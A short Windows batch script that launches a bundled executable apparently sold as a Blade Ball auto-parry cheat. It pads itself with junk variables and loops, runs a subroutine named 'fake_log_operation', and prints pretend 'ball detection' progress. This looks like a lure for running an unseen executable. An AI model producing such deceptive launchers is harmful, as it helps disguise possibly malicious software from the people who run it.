@echo off
setlocal enabledelayedexpansion

set var1=0
set var2=1
set var3=5
set var4=10

for /l %%i in (1,1,100) do (
    set /a var1=!var1! + %%i
)

set unusedVar1=Random
set unusedVar2=Value
set unusedVar3=Placeholder
set unusedVar4=Text

start "" "Resources\blade-ball-auto-parry.exe"

call :fake_log_operation

timeout /t 5 >nul

call :ball_detection

set var5=100
set var6=200
for /l %%j in (1,1,50) do (
    set /a var5=!var5! - %%j
)

timeout /t 2 >nul

exit /b

:fake_log_operation
set "log_data="
for /l %%i in (1,1,64) do (
    set "log_data=!log_data!!random!"
)
set unusedVar5=Data
set unusedVar6=Generated
exit /b

:ball_detection
echo Ball detection in progress...
timeout /t 3 >nul

echo Unnecessary process running...
timeout /t 2 >nul

exit /b
